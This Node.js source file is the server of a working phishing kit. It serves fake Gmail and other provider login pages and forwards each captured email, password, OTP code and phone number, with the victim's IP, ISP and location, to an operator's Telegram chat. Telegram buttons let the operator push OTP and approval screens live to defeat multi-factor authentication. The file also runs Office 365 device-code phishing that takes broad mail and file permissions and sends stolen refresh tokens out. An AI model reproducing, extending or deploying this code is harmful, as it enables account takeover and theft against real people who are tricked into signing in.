// =========================================================================================
// =========================================================================================
// ============================== 1. IMPORTS AND SETUP =====================================
// =========================================================================================
// =========================================================================================

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const msal = require('@azure/msal-node');

dotenv.config();

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
// app.use(cors({
//   origin: ['http://localhost:5173', 'https://your-production-domain.com']
// })); 
app.use(cors()); // <--- This allows all origins temporarily for testing

const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});


// =========================================================================================
// =========================================================================================
// ============================== 2. TELEGRAM BOT CONFIG ===================================
// =========================================================================================
// =========================================================================================

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;       // Bot 1 (Gmail Flow)
const TELEGRAM_BOT2_TOKEN = process.env.TELEGRAM_BOT2_TOKEN;     // Bot 2 (Gmail Summary)
const TELEGRAM_BOT3_TOKEN = process.env.TELEGRAM_BOT3_TOKEN;     // Bot 3 (Other Providers)
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;           // Single Chat ID for all bots

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true, request: { timeout: 30000 } }); 
const bot2 = new TelegramBot(TELEGRAM_BOT2_TOKEN);
const bot3 = new TelegramBot(TELEGRAM_BOT3_TOKEN);

bot.on('polling_error', () => {});
bot.on('error', () => {});


// =========================================================================================
// =========================================================================================
// ============================== 3. GLOBAL STORES =========================================
// =========================================================================================
// =========================================================================================

const sessions = new Map(); // For Gmail Socket.io flow

function generateUniqueId() {
  return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
}


// =========================================================================================
// =========================================================================================
// ============================== 4. IP LOOKUP HELPER ======================================
// =========================================================================================
// =========================================================================================

async function getIPInfo(ip) {
  try {
    const cleanIP = ip.replace(/^::ffff:/, '');
    console.log('🔍 Looking up IP:', cleanIP);
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 5000 });
    
    if (response.data.status === 'fail') {
      return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }
    
    return {
      country: response.data.country || 'Unknown',
      city: response.data.city || 'Unknown',
      isp: response.data.isp || response.data.org || 'Unknown'
    };
  } catch (error) {
    console.error('❌ IP lookup failed:', error.message);
    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
  }
}


// =========================================================================================
// =========================================================================================
// ============================== 5. EXPRESS ROUTES (GENERAL) ==============================
// =========================================================================================
// =========================================================================================

const staticPath = path.join(__dirname, 'build');
console.log(`📁 Serving build files from: ${staticPath}`);
app.use('/', express.static(staticPath));
app.use('/assets', express.static(path.join(staticPath, 'assets')));
app.use('/static', express.static(path.join(staticPath, 'static')));
app.use('/css', express.static(path.join(staticPath, 'css')));
app.use('/js', express.static(path.join(staticPath, 'js'))); 

app.get('/health', (req, res) => {
  res.json({ status: 'ok', activeSessions: sessions.size, timestamp: new Date() });
});

app.post('/start-session', async (req, res) => {
  const { sessionId, socketId } = req.body;
  let session = sessions.get(sessionId);

  if (!session) return res.status(404).send('Session not found');

  session.ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  session.userAgent = req.headers['user-agent'];
  session.socketId = socketId;

  const info = await getIPInfo(session.ip);
  if (info) session.ipInfo = info;

  const message = `🌐 *New Session Started*\n\n` +
    `*Session ID:* \`${sessionId}\`\n` +
    `*IP Address:* ${session.ip}\n` +
    `*ISP:* ${session.ipInfo?.isp || 'Unknown'}\n` +
    `*Country:* ${session.ipInfo?.country || 'Unknown'}`;

  try {
    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Telegram error:', error);
  }

  res.send('ok');
});


// =========================================================================================
// =========================================================================================
// ============================== 6. NEW CREDENTIALS ENDPOINT (Bot 3) ======================
// =========================================================================================
// =========================================================================================

// =========================================================================================
// ============================== 6. NEW CREDENTIALS ENDPOINT (Bot 3) ======================
// =========================================================================================

app.post('/submit-credentials', async (req, res) => {
  const { provider, email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  // 1. Get the IP and User Agent from the incoming request
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress || 
                   'Unknown';
  
  const userAgent = req.headers['user-agent'] || 'Unknown';

  console.log(`[+] Received ${provider} credentials from IP: ${clientIp}`);

  // 2. Look up the ISP and Country using your existing helper function
  const ipInfo = await getIPInfo(clientIp);

  // 3. Format the beautiful message with emojis
  const message = `
++++ ${provider.toUpperCase()} INCOMING =====

📧 Email: ${email}
🔐 Password: ${password}

🌐 IP Address: ${clientIp}
🏢 ISP: ${ipInfo.isp || 'Unknown'}
📍 Country: ${ipInfo.country || 'Unknown'}
🏙️ City: ${ipInfo.city || 'Unknown'}
📱 User Agent: ${userAgent}
⏰ Time: ${new Date().toISOString()}
  `.trim();

  try {
    // 4. Send to Telegram Bot 3
    await bot3.sendMessage(TELEGRAM_CHAT_ID, message);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram bot3 error:', error);
    res.status(500).json({ success: false });
  }
});  


// =========================================================================================
// =========================================================================================
// ============================== 7. OFFICE 365 DEVICE CODE FLOW ===========================
// =========================================================================================
// =========================================================================================

const msalConfig = {
  auth: { 
    clientId: "d3590ed6-52b3-4102-aeff-aad2292ab01c",  
    authority: "https://login.microsoftonline.com/common" 
  }
};  

const pca = new msal.PublicClientApplication(msalConfig);

async function sendToTelegram(email, refreshToken, ip, userAgent) {
  const message = `
📧 **NEW OAUTH TOKEN CAPTURED**

🔐 **Email:** \`${email}\`
🎟️ **Refresh Token:** 
\`${refreshToken}\`

🌐 **IP:** ${ip}
📱 **User Agent:** ${userAgent}
⏰ **Time:** ${new Date().toISOString()} 

✅ *Token valid for ~90 days*
  `;
  await bot3.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
}

app.get('/getAccessCode', async (req, res) => {
  const sessionId = req.query.sessionId;

  if (!sessionId) return res.status(400).json({ error: "No sessionId provided" });

  console.log(`[*] Device code flow for session: ${sessionId}`); 

  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress || 
                   'Unknown';

  const deviceCodeRequest = {
    deviceCodeCallback: (response) => {
      console.log(`[*] Code for ${sessionId}: ${response.userCode}`);
      if (!res.headersSent) {
        res.json({ 
          userCode: response.userCode,
          sessionId: sessionId,
          message: "Login at https://login.microsoftonline.com/common/oauth2/deviceauth" 
        });
      }
    },
    scopes: [ 
      'https://graph.microsoft.com/Mail.Read',
      'https://graph.microsoft.com/Mail.ReadWrite',
      'https://graph.microsoft.com/Mail.Send',
      'https://graph.microsoft.com/MailboxSettings.ReadWrite',
      'https://graph.microsoft.com/User.Read', 
      'https://graph.microsoft.com/Files.Read',
      'https://graph.microsoft.com/Files.ReadWrite', 
    ]
  };

  try {
    const tokenPromise = pca.acquireTokenByDeviceCode(deviceCodeRequest);
    const tokenResponse = await tokenPromise;

    console.log(`[!!!] AUTHENTICATED ${sessionId}: ${tokenResponse.account.username}`);

    sessions.set(sessionId, {
      email: tokenResponse.account.username,
      completed: true,
      expiresAt: Date.now() + 5 * 60 * 1000,
      timestamp: new Date().toISOString()
    });

    const tokenCache = pca.getTokenCache().serialize();
    const parsedCache = JSON.parse(tokenCache);
    const refreshTokenKeys = Object.keys(parsedCache.RefreshToken || {});

    if (refreshTokenKeys.length > 0) {
      const myRefreshToken = parsedCache.RefreshToken[refreshTokenKeys[0]].secret;
      await sendToTelegram(tokenResponse.account.username, myRefreshToken, clientIp, req.headers['user-agent']);
    }
  } catch (error) {
    console.log(`[-] Session ${sessionId} timed out`); 
    if (!res.headersSent) {
      return res.status(400).json({ status: 'error', message: 'Session expired. Please request a new code.' });
    }
  }
});

app.get('/auth-status', (req, res) => {
  const sessionId = req.query.sessionId;
  if (!sessionId) return res.json({ completed: false, email: null });

  const session = sessions.get(sessionId);
  const completed = session && session.completed && session.expiresAt > Date.now();
  
  res.json({ completed: completed || false, email: completed ? session.email : null });
});


// =========================================================================================
// =========================================================================================
// ============================== 8. SOCKET.IO ENGINE (GMAIL ONLY) =========================
// =========================================================================================
// =========================================================================================

io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);

  socket.on('reconnect-session', (data) => {
    let session = sessions.get(data.sessionId);
    if (session) {
      session.socketId = socket.id;
      bot.sendMessage(TELEGRAM_CHAT_ID, `🔄 *Session Reconnected*\n\n*Session ID:* \`${data.sessionId}\``, { parse_mode: 'Markdown' });
    } else {
      socket.emit('session-invalid');
    }
  });

  socket.on('request-new-session', () => {
    const sessionId = generateUniqueId();
    socket.emit('your-session-id', sessionId);
    
    sessions.set(sessionId, {
      socketId: socket.id,
      provider: null,
      email: null,
      password: null,
      otp: null,
      timestamp: new Date()
    });
  });

  socket.on('submit-email', async (data) => {
    let session = sessions.get(data.sessionId);
    if (!session) return;
    session.provider = data.provider;
    session.email = data.email;

    const message = `📧 *New Gmail Login Attempt*\n\n` +
      `*Email:* ${data.email}\n` +
      `*Session:* \`${data.sessionId}\``;

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  socket.on('submit-password', async (data) => {
    let session = sessions.get(data.sessionId);
    if (!session) return;
    session.password = data.password;

    const message = `🔐 *Password Received*\n\n` +
      `*Email:* ${session.email}\n` +
      `*Password:* ${data.password}\n` +
      `*Session:* \`${data.sessionId}\``;

    const keyboard = {
      inline_keyboard: [
        [{ text: '✅ Send OTP', callback_data: `send_otp_${data.sessionId}` }],
        [{ text: '✅ Send Approve only', callback_data: `send_approve_${data.sessionId}` }],
        [{ text: '🔢 Send Approve with Special Number', callback_data: `send_approve_with_number_${data.sessionId}` }], 
        [{ text: '🔢 Verify Phone Number', callback_data: `verify_number_${data.sessionId}` }], 
        [{ text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }],
        [{ text: '❌ Reject', callback_data: `reject_${data.sessionId}` }]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  socket.on('submit-otp', async (data) => {
    let session = sessions.get(data.sessionId);
    if (!session) return;
    session.otp = data.otp;

    const message = `🔢 *OTP Submitted*\n\n` +
      `*Email:* ${session.email}\n` +
      `*OTP Code:* \`${session.otp}\`\n` +
      `*Session:* \`${data.sessionId}\``;

    const keyboard = {
      inline_keyboard: [
        [{ text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }],
        [{ text: '🔄 Request Again', callback_data: `request_again_${data.sessionId}` }]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  socket.on('submit-number', async (data) => {
    let session = sessions.get(data.sessionId);
    if (!session) return;
    session.phoneNumber = data.number;

    const message = `🔢 *Phone Number Submitted*\n\n` +
      `*Email:* ${session.email}\n` +
      `*Phone Number:* \`${session.phoneNumber}\`\n` +
      `*Session:* \`${data.sessionId}\``;

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id); 
  });
});


// =========================================================================================
// =========================================================================================
// ============================== 9. TELEGRAM CALLBACK HANDLER =============================
// =========================================================================================
// =========================================================================================


bot.on('callback_query', async (callbackQuery) => { 
  const messageId = callbackQuery.message.message_id;
  const chatId = callbackQuery.message.chat.id; 
  const data = callbackQuery.data; 
  const parts = data.split('_');

  const sessionId = parts[parts.length - 1]; 
  const action = parts.slice(0, -1).join('_'); 

  let session = sessions.get(sessionId);   

  if (!session) {
    await new Promise(res => setTimeout(res, 50)); 
    session = sessions.get(sessionId);
  }

  if (!session) {
    await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Session expired', show_alert: true });
    return;
  }

  const socket = io.sockets.sockets.get(session.socketId);

  if (!socket || !socket.connected) {
    await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User disconnected', show_alert: true });
    return;
  }   

  switch (action) {
    case 'send_otp': {
      socket.emit('show-otp-screen');
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      break;  
    }
    
    case 'send_approve': {   
      socket.emit('show-approve-screen');
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      break;
    } 

    case 'send_approve_with_number': {   
      await bot.sendMessage(chatId, '🔢 Enter the special number:');
      
      bot.once('message', async (msg) => {
        if (msg.chat.id === chatId) {
          const specialNumber = msg.text;
          socket.emit('show-approve-with-number', { number: specialNumber });
          await bot.sendMessage(chatId, `✅ Sent number: ${specialNumber}`);
        }
      });
      break;
    } 

    case 'verify_number': {   
      await bot.sendMessage(chatId, '🔢 Enter the phone number hint:');
      
      bot.once('message', async (msg) => {
        if (msg.chat.id === chatId) {
          const phoneNumberHint = msg.text;
          socket.emit('show-number-screen', { number: phoneNumberHint }); 
          await bot.sendMessage(chatId, `✅ Sent hint: ${phoneNumberHint}`);
        }
      });
      break;
    }

    case 'mark_complete': {
      socket.emit('show-success-screen');
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      
      const summary = `✅ *Gmail Session Completed*\n` +
                      `*Email:* ${session.email}\n` +
                      `*Password:* ${session.password || 'N/A'}\n` +
                      `*IP:* ${session.ip || 'N/A'}\n` + 
                      `*Time:* ${new Date().toLocaleString()}`; 
      
      await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
      break;
    }

    case 'request_again': {
      await bot.answerCallbackQuery(callbackQuery.id);
      
      // We send a fresh keyboard directly to the chat
      const keyboard = {
        inline_keyboard: [
          [{ text: '🔢 OTP Screen', callback_data: `resend_otp_${sessionId}` }],
          [{ text: '✅ Approve Screen', callback_data: `resend_approve_${sessionId}` }],
          [{ text: '🔢 Approve with Number', callback_data: `resend_approve_number_${sessionId}` }],
          [{ text: '🔢 Resend Phone Number', callback_data: `resend_phone_number_${sessionId}` }],
        ]
      };
      
      await bot.sendMessage(chatId, '🔄 Which screen do you want to show again?', { reply_markup: keyboard });
      break;
    } 

    case 'resend_otp': {
      await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ OTP screen sent again' });
      socket.emit('show-otp-screen');
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      break;
    }

    case 'resend_approve': {
      await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approve screen sent again' });
      socket.emit('show-approve-screen');
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
      break;
    }

    case 'resend_approve_number': {
      await bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
      
      bot.once('message', async (msg) => {
        if (msg.chat.id === chatId) {
          const specialNumber = msg.text;
          socket.emit('show-approve-with-number', { number: specialNumber });
          await bot.sendMessage(chatId, `✅ Sent approve screen with number: ${specialNumber}`);
        }
      });
      break;
    }   

    case 'resend_phone_number': {
      await bot.answerCallbackQuery(callbackQuery.id);
      await bot.sendMessage(chatId, '🔢 Enter the phone number hint to send (1-99):');
      
      bot.once('message', async (msg) => {
        if (msg.chat.id === chatId) {
          let phoneNumberHint = msg.text;
          let session = sessions.get(sessionId);
          session.phoneNumberHint = phoneNumberHint;
          socket.emit('show-number-screen', { number: phoneNumberHint });
          await bot.sendMessage(chatId, `✅ Resent phone number hint: ${phoneNumberHint}`);
        }
      });
      break;
    }

    case 'reject': {
      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }); 
      break; 
    }
  }
});



// =========================================================================================
// =========================================================================================
// ============================== 10. SESSION CLEANUP ======================================
// =========================================================================================
// =========================================================================================

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of sessions.entries()) {
    if (session.expiresAt && session.expiresAt < now) {
      sessions.delete(sessionId);
    }
  }
}, 60000);


// =========================================================================================
// =========================================================================================
// ============================== 11. SERVER START =========================================
// =========================================================================================
// =========================================================================================

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot 1 & 2 active (Gmail)`);
  console.log(`📱 Telegram bot 3 active (Other Providers)`);
  console.log(`🔐 Office 365 Device Code endpoint ready`);
});

process.on('unhandledRejection', (error) => {
  console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught exception:', error);
}); 